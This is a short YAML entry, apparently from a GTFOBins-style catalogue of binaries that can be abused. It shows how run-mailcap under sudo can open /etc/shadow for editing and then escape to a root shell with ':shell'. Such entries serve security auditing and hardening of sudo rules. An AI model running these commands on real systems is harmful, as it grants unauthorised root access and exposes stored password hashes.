---
functions:
  sudo:
    - code: |
        sudo run-mailcap --action=edit /etc/shadow  
        :shell
---
